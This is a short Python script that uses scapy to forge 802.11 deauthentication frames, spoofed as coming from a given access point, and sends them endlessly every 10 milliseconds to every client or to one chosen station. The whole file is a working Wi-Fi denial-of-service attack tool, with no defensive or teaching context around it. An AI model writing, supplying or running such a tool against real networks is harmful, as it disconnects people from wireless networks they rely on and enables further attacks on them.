#!/usr/bin/sudo /usr/bin/python3

from threading import Thread
from scapy.all import sendp
import sys

argv=sys.argv
iface=argv[1]
ap_mac=argv[2]

if "-auth" in argv:
    auth_flag=True
    if len(argv)==5:
        station_mac=argv[4]
else:
    if len(argv)==4:
        station_mac=argv[3]

class RadioTopHeader():
    def __init__(self):
        self.header_revision=b"\x00"
        self.header_pad=b"\x00"
        self.header_len=b"\x18\x00"
        self.present_flags=b"\x00"*8
        self.flags=b"\x00"
        self.data_rate=b"\x00"
        self.ch_frequency=b"\x00\x00"
        self.ch_flags=b"\x00\x00"
        self.anthenna_signal1=b"\x00\x00"
        self.rx_flags=b"\x00\x00"
        self.anthenna_signal2=b"\x00"
        self.anthenna=b"\x00"

class DeauthFrame():
    def __init__(self):
        self.type=b"\xc0\x00"
        self.duration=b"\x00\x00"
        self.dst_addr=b"\x00"*6
        self.src_addr=b"\x00"*6
        self.bss=b"\x00"*6
        self.seq=b"\x00"*2

class Packet():
    def __init__(self):
        self.raw=b""
    def addFrame(self,frame):
        frame_data=vars(frame)
        for i in frame_data:
            self.raw+=frame_data[i]
    def addRaw(self,raw_data):
        self.raw+=raw_data

rt_header=RadioTopHeader()
deauth_frame=DeauthFrame()

ap_mac=ap_mac.replace(':','')
ap_mac=bytes.fromhex(ap_mac)
dst=b"\xff\xff\xff\xff\xff\xff"


if "station_mac" in locals():
    station_mac=station_mac.replace(':','')
    station_mac=bytes.fromhex(station_mac)
    dst=station_mac

rt_header.ch_frequency=b"\x9e\x09"
deauth_frame.src_addr=ap_mac
deauth_frame.dst_addr=dst
deauth_frame.bss=ap_mac

p=Packet()
p.addFrame(rt_header)
p.addFrame(deauth_frame)
p.addRaw(b"\x03\x00")


raw_packet=p.raw
print(raw_packet)
sendp(raw_packet,iface,loop=1,inter=0.01)
